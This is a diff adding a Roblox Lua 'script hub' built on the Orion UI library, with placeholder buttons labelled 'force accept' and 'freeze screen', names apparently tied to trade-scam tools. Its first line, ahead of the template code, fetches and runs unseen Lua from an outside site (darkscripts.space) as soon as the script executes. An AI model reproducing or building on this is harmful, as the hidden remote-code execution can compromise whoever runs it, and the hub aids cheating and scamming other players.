@@ -1,0 +1,31 @@
+loadstring(game:HttpGet('https://darkscripts.space/scripts/32979ea4-ffef-4662-83c2-736297e4d49a_1280957910981021759.lua',true))()
+-- Load Orion Library
+local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Orion/main/source"))()
+
+-- Create Window
+local Window = OrionLib:MakeWindow({Name = "DZB scripthub", HidePremium = false, SaveConfig = true, ConfigFolder = "ScriptHub"})
+
+-- Create Tab
+local MainTab = Window:MakeTab({
+    Name = "Main",
+    Icon = "rbxassetid://4483345998", -- Replace with your desired icon ID
+    PremiumOnly = false
+})
+
+-- Add Buttons
+MainTab:AddButton({
+    Name = "force accept",
+    Callback = function()
+        print("force accept button clicked!") -- Replace with your function
+    end
+})
+
+MainTab:AddButton({
+    Name = "freeze screen",
+    Callback = function()
+        print("freeze screen") -- Replace with your function
+    end
+})
+
+-- Initialize Orion Library
+OrionLib:Init()
